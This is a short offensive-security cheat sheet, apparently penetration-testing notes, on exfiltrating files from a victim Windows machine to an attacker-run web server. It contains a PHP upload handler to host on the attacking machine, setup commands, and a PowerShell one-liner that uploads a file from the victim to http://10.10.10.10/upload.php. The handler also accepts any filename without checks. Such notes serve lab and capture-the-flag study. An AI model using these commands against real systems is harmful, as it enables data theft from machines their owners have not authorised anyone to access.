# PHP Server

## Overview

* if outbound HTTP traffic is not blocked, powershell can be used to upload files to the attacking machine through PHP code hosted on the attacking machine's web server
* it works through an HTTP post request

## How To

```php
# create a PHP file and put it inside of /var/www/html/ within the attacking machine
# save it as "upload.php"
# this code processes incoming upload requests and moves them to the uploads directory
<?php
$updir = '/var/www/uploads/';

$upfile = $updir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $upfile)
?>

# remember to create the /var/www/uploads/ folder and modify www-data permissions
# so that anyone can upload files to the uploads.php page
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads

# use this command to transfer from the victim machine to the attacker's HTTP server
powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.10.10/upload.php', 'examplefile.txt')
```

